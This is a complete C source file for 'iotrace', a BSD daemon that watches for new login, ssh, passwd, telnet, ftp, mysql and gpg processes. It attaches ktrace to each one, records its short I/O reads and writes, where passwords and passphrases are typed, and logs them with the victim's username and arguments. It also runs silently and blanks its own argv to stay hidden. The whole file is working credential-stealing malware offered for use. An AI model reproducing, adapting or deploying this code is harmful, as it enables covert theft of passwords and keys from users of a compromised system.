/*
 * $Id: iotrace-OpenFreeBSD.c,v 1.4 2004/12/25 13:33:32 xenion Exp $
 *
 * Copyright (c) 2004 Dallachiesa Michele <michele.dallachiesa at poste.it> 
 *
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification are permitted.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * OpenBSD: 'cc -lm -lkvm -DOPENBSD iotrace-OpenFreeBSD.c -o iotrace'
 * FreeBSD: 'cc -lm -lkvm -DFREEBSD iotrace-OpenFreeBSD.c -o iotrace'
 *
 * HAVE FUN!
 */


#include <sys/param.h>
#include <sys/user.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/ktrace.h>
#include <fcntl.h>
#include <kvm.h>
#include <stdio.h>
#include <unistd.h>
#include <limits.h>
#include <sys/proc.h>
#include <sys/sysctl.h>
#include <errno.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <pwd.h>


// monitored commands (comm)
#define MONITORED_CMDS               \
  "login",  "ssh",  "sshd", "ftp",   \
  "telnet",  "rsh",  "scp",  "rcp",  \
  "rlogin",  "rexec",  "passwd",     \
  "adduser",  "mysql", "gpg"


#define MAX_IOLEN 128		// max i/o length. with -c you can set a
				// lower value.. try with 1 :> 
#define PROC_TRACE_TIMEOUT 20	// trace i/o just for 20 seconds
#define NSECSLEEP 200000000	// check for new processes every 1/5
				// seconds
#define MAX_PROCS 32		// max simultaneous traced processes
#define NSECS_IN_1SEC 1000000000	// nanoseconds in 1 second
#define PREFIX_PROCLOG "trace"
#define PREFIX_DAEMONLOG "daemon"

// be really verbose.. 
// #define DEBUG


#if defined(OPENBSD)
#define OS "OpenBSD"
#elif defined(FREEBSD)
#define OS "FreeBSD"
#endif

#define ID0 "IOTRACE " VER OS


#define SAFE_FCLOSE(x) do{ if(x) { fclose(x); x = NULL; } }while(0)

#define SIGSTR(x) x == SIGURG  ? "SIGURG"  : \
                  x == SIGPIPE ? "SIGPIPE" : \
                  x == SIGQUIT ? "SIGQUIT" : \
                  x == SIGINT  ? "SIGINT"  : \
                  x == SIGTERM ? "SIGTERM" : \
                  x == SIGHUP  ? "SIGHUP"  : \
                  x == SIGSEGV ? "SIGSEGV" : \
                  x == SIGBUS  ? "SIGBUS"  : \
                  x == SIGALRM ? "SIGALRM" : "UNKWOWN"


// returns 1 if a > b, -1 if a < b, 0 if a == b
#define myrealtimercmp(a, b) (         \
   a.tv_sec > b.tv_sec ? 1 :           \
   a.tv_sec < b.tv_sec ? -1 :          \
   a.tv_usec > b.tv_usec ? 1 :         \
   a.tv_usec < b.tv_usec ? -1 : 0 )

#define mytimersub(a, b, result)                           \
  do {                                                     \
    (result)->tv_sec = (a)->tv_sec - (b)->tv_sec;          \
    (result)->tv_usec = (a)->tv_usec - (b)->tv_usec;       \
    if ((result)->tv_usec < 0) {                           \
      --(result)->tv_sec;                                  \
      (result)->tv_usec += 1000000;                        \
    }                                                      \
  } while (0)


typedef struct ktraced_proc {
    pid_t           pid;
    struct timeval  tv;
    int             active;
    unsigned long   logind;
} ktraced_proc_t;

typedef struct {
    char            dir[PATH_MAX];
    int             max_iolen;
    int             silent;
} OPT;


void            procs_add(pid_t pid);
void            procs_update();
struct kinfo_proc *ntarget(kvm_t * kd);
void            sleepfor(long sec, long nsec);
char           *npathname(const char *dir, const char *prefix,
			  unsigned long *ind);
void            fatal(const char *format, ...);
void            help();
void            init_opt(int, char **);
void            die(int);
void            log(const char *format, ...);
void            clean_ktrace(unsigned long logind);


struct timeval  last_proc_tv = { 0, 0 };
ktraced_proc_t  procs[MAX_PROCS];
int             nprocs = 0;
OPT             o;
FILE           *dlog = NULL;
char           *monitored[] = { MONITORED_CMDS, NULL };


int
main(int argc, char **argv)
{
    char            errbuf[_POSIX2_LINE_MAX];
    struct kinfo_proc *kp;
    kvm_t          *kd;
    unsigned long long i;
    int             z;
    struct timeval *tv;


    if (argc == 1)
	help();
    init_opt(argc, argv);

    log("options: dir='%s' max_iolen=%d silent=%d", o.dir, o.max_iolen,
	o.silent);

    setsid();
    if (fork())
	exit(0);

    signal(SIGTERM, die);
    signal(SIGINT, die);
    signal(SIGSEGV, die);

#if defined(OPENBSD)
    kd = kvm_openfiles(NULL, NULL, NULL, KVM_NO_FILES, errbuf);
#elif defined(FREEBSD)
    kd = kvm_openfiles(NULL, NULL, NULL, O_RDONLY, errbuf);
#endif

    if (kd == NULL)
	fatal("kvm_openfiles: %s", errbuf);

    // initializing 'last_proc_tv'..

    if ((kp = kvm_getprocs(kd, KERN_PROC_ALL, 0, &z)) == NULL)
	fatal("kvm_getprocs: err");

    for (i = 0; i < z; i++) {

#if defined(OPENBSD)
	if (kp[i].kp_eproc.e_pstats_valid == 0)
	    continue;
	tv = &kp[i].kp_eproc.e_pstats.p_start;
#elif defined(FREEBSD)
	tv = &kp[i].kp_eproc.e_stats.p_start;
#endif

	z = myrealtimercmp((*tv), last_proc_tv);

	if (z == 1) {
	    last_proc_tv.tv_sec = tv->tv_sec;
	    last_proc_tv.tv_usec = tv->tv_usec;
	}
    }

    // 'last_proc_tv' initialized. 

    // initializing 'procs array'..
    for (i = 0; i < MAX_PROCS; i++)
	procs[i].active = 0;

    log("monitoring");

    for (i = 0;; i++) {

	sleepfor(0, NSECSLEEP);

	// update the 'procs' array every 5 seconds if there's something
	if (nprocs != 0 && i * NSECSLEEP / NSECS_IN_1SEC > 5) {
	    procs_update();
	    i = 0;
	}
	if (nprocs == MAX_PROCS)
	    // no free slots.
	    continue;

	if ((kp = ntarget(kd)) == NULL)
	    continue;
	else
	    procs_add(kp->kp_proc.p_pid);
    }


}


void
procs_update()
{
    struct timeval  tv,
                    tmp;
    int             i;


#ifdef DEBUG
    log("updating procs (nprocs=%d)", nprocs);
#endif

    if (nprocs == 0)
	return;

    gettimeofday(&tv, NULL);

    for (i = 0; i < MAX_PROCS; i++) {

	// it 's a free slot ?
	if (procs[i].active != 1)
	    continue;

	// the timer isn 't exired ?
	mytimersub(&tv, &procs[i].tv, &tmp);
	if (tmp.tv_sec <= PROC_TRACE_TIMEOUT)
	    continue;

	// the timer expired !

#ifdef DEBUG
	log("timer expired for pid %d", procs[i].pid);
#endif

	if (ktrace(NULL, KTROP_CLEAR, KTRFAC_GENIO, procs[i].pid) == -1
	    && errno != ESRCH)
	    fatal("ktrace KTROP_CLEAR: %s", strerror(errno));

#ifdef DEBUG
	if (errno == ESRCH)
	    log("process already exited");
#endif

	clean_ktrace(procs[i].logind);

	// freeing slot...

	procs[i].active = 0;
	nprocs--;

    }
}


void
clean_ktrace(unsigned long logind)
{
    static char     pathname[PATH_MAX];
    static char     buf[MAX_IOLEN];
    struct ktr_header ktrh;
    int             z;
    FILE           *f0,
                   *f1;


#ifdef DEBUG
    log("clean_ktrace: logind=%ld ", logind);
#endif

    snprintf(pathname, PATH_MAX, "%s/%s.%ld_", o.dir, PREFIX_PROCLOG,
	     logind);
    if (!(f1 = fopen(pathname, "w")))
	fatal("clean_ktrace: fopen '%s': %s", pathname, strerror(errno));

    pathname[strlen(pathname) - 1] = '\0';	// "bubu/baba.xyz_"->
    // "bubu/baba.xyz"
    if (!(f0 = fopen(pathname, "r")))
	fatal("clean_ktrace: fopen '%s': %s", pathname, strerror(errno));

    // now 'path' is ready for unlink

    for (;;) {

	if (fread(&ktrh, 1, sizeof(struct ktr_header), f0) <
	    sizeof(struct ktr_header))
	    break;

	if (ktrh.ktr_type != KTR_GENIO)
	    fatal("clean_ktrace: unexpected record of type==%d",
		  ktrh.ktr_type);

	ktrh.ktr_len -= sizeof(struct ktr_genio);
	fseek(f0, sizeof(struct ktr_genio), SEEK_CUR);

#ifdef DEBUG
	log("record i/o len=%d", ktrh.ktr_len);
#endif

	// record too big?
	if (ktrh.ktr_len > o.max_iolen) {
	    // we 've to skip data

#ifdef DEBUG
	    log("record skipped");
#endif

	    fseek(f0, ktrh.ktr_len, SEEK_CUR);
	    continue;
	}
	if (fread(buf, 1, ktrh.ktr_len, f0) != ktrh.ktr_len)
	    fatal("broken record");
	fwrite(buf, 1, ktrh.ktr_len, f1);

    }

    fclose(f0);
    fclose(f1);

#ifdef DEBUG
    log("unlinking '%s'", pathname);
#endif
    unlink(pathname);
}


void
procs_add(pid_t pid)
{
    int             procid;
    char           *pathname;

    for (procid = 0; procid < MAX_PROCS; procid++)
	if (procs[procid].active != 1)
	    break;

    if (procid == MAX_PROCS)
	// no free slots;
	return;

    pathname = npathname(o.dir, PREFIX_PROCLOG, &procs[procid].logind);

    if (ktrace(pathname, KTROP_SET, KTRFAC_GENIO, pid) < 0)
	fatal("ktrace failed: %s", strerror(errno));


    procs[procid].pid = pid;
    gettimeofday(&procs[procid].tv, NULL);
    procs[procid].active = 1;

#ifdef DEBUG
    log("proc added: pid=%d logind=%d nprocs=%d", pid,
	procs[procid].logind, nprocs);
#endif

    nprocs++;
}


struct kinfo_proc *
ntarget(kvm_t * kd)
{
    struct kinfo_proc *kp;
    int             j,
                    i,
                    z;
    char          **procargv;
    struct passwd  *pwd;
    struct timeval *tv;

    if ((kp = kvm_getprocs(kd, KERN_PROC_ALL, 0, &z)) == NULL)
	fatal("kvm_getprocs: err");

    for (i = 0; i < z; i++) {

#ifdef OPENBSD
	// it 's an active process ?
	if (kp[i].kp_eproc.e_pstats_valid == 0)
	    continue;
	tv = &kp[i].kp_eproc.e_pstats.p_start;
#endif

#ifdef FREEBSD
	tv = &kp[i].kp_eproc.e_stats.p_start;
#endif

	// it 's a new process ?
	z = myrealtimercmp((*tv), last_proc_tv);
	if (z != 1)
	    continue;

	// it 's an interesting process ? 
	z = 0;
	for (j = 0; monitored[j]; ++j)
	    if (strcmp(kp[i].kp_proc.p_comm, monitored[j]) == 0) {
		z = 1;
		break;
	    }
	if (z == 0)
	    continue;

	// it's a new suitable target!

	procargv = kvm_getargv(kd, &kp[i], 0);
	log("new target found: pid=%d", kp[i].kp_proc.p_pid);
	fprintf(dlog, "argv[]: ");
	for (j = 0; procargv[j]; j++)
	    fprintf(dlog, "%s ", procargv[j]);
	fprintf(dlog, "\n");
	log("uid: %d", kp[i].kp_eproc.e_pcred.p_ruid);
	if ((pwd = getpwuid(kp[i].kp_eproc.e_pcred.p_ruid)) != NULL)
	    log("user: %s", pwd->pw_name);

	last_proc_tv.tv_sec = tv->tv_sec;
	last_proc_tv.tv_usec = tv->tv_usec;
	return &kp[i];

    }

    // nothing to return..
    return NULL;
}


void
sleepfor(long sec, long nsec)
{
    struct timespec req;

    req.tv_sec = sec;
    req.tv_nsec = nsec;

    nanosleep(&req, NULL);
}


char           *
npathname(const char *dir, const char *prefix, unsigned long *ind)
{
    int             fd;
    static char     pathname[PATH_MAX];
    static unsigned long index = 0;
    struct stat     mystat;


    if (stat(dir, &mystat) != 0 || !S_ISDIR(mystat.st_mode))
	fatal("npathname: '%s' does not exist or it isn't a directory",
	      dir);

    for (;;) {
	if (index == ULONG_MAX)
	    // overflow check
	    fatal("npathname: index overflow");
	snprintf(pathname, PATH_MAX, "%s/%s.%ld", dir, prefix, index);
	fd = open(pathname, O_CREAT | O_EXCL | O_RDWR | S_IRUSR | S_IWUSR);
	index++;
	if (fd != -1)
	    break;
    }

    if (ind)
	*ind = index - 1;

    close(fd);

#ifdef DEBUG
    log("npathname: '%s'", pathname);
#endif

    return pathname;
}


void
init_opt(int argc, char **argv)
{
    int             c;
    char           *pathname;

    o.dir[0] = '\0';
    o.max_iolen = MAX_IOLEN;
    o.silent = 0;

    while ((c = getopt(argc, argv, "l:c:sV")) != EOF)
	switch (c) {

	case 'l':
	    strncpy(o.dir, optarg, PATH_MAX - 1);
	    o.dir[PATH_MAX - 1] = '\0';
	    break;

	case 'c':
	    o.max_iolen = atoi(optarg);
	    break;

	case 's':
	    o.silent = 1;
	    break;

	case 'V':
	    printf("%s\n", ID0);
#ifdef DEBUG
	    printf("Warning: DEBUG defined.\n");
#endif
	    exit(0);

	default:
	    exit(0);

	}


    if (o.dir[0] == '\0')
	fatal("logs directory required");

    if (strlen(o.dir) > PATH_MAX + 20)
	fatal("logs directory path too big");

    dlog = fopen(npathname(o.dir, PREFIX_DAEMONLOG, NULL), "w");
    if (dlog == NULL)
	fatal("init_opt: fopen: %s", strerror(errno));

    for (c = 1; c < argc; ++c)
	memset(argv[c], '\0', strlen(argv[c]));
}


void
help()
{
    int             i,
                    c;


    printf("USAGE: iotrace [options]\n\n");
    printf(" -l path          The logs directory\n");
    printf
	(" -c count         Ignore I/O if length is greater than <count>\n");
    printf("                  bytes (default is %d)\n", MAX_IOLEN);
    printf(" -s               Be totally silent on stdout/stderr\n");
    printf(" -V               Display version information\n\n");


    printf("Monitoring: ");
    c = 12;
    for (i = 0; monitored[i]; ++i) {
	c += strlen(monitored[i]) + 2;
	if (c > 70) {
	    c = 0;
	    printf("\n");
	}
	printf("%s%c ", monitored[i], monitored[i + 1] ? ',' : '.');
    }
    printf("\n\n");
    exit(0);
}


void
fatal(const char *format, ...)
{
    va_list         ap;


    if (dlog == NULL && !o.silent)
	dlog = stdout;

    if (dlog) {
	fprintf(dlog, "\nfatal error: ");
	va_start(ap, format);
	vfprintf(dlog, format, ap);
	va_end(ap);
	fprintf(dlog, "\n");
    }
    die(SIGTERM);
}


void
die(int signo)
{
    static int      dead = 0;
    int             i;

    dead++;


    if (dead > 1)
	exit(0);

    log("caught %s(%d) signal, cleaning up", SIGSTR(signo), signo);

    if (nprocs != 0)
	for (i = 0; i < MAX_PROCS; i++)
	    if (procs[i].active)
		clean_ktrace(procs[i].logind);

    SAFE_FCLOSE(dlog);
    exit(0);
}


void
log(const char *format, ...)
{
    va_list         ap;

    if (dlog) {
	va_start(ap, format);
	vfprintf(dlog, format, ap);
	va_end(ap);
	fprintf(dlog, "\n");
	fflush(dlog);
    }
}

// eof
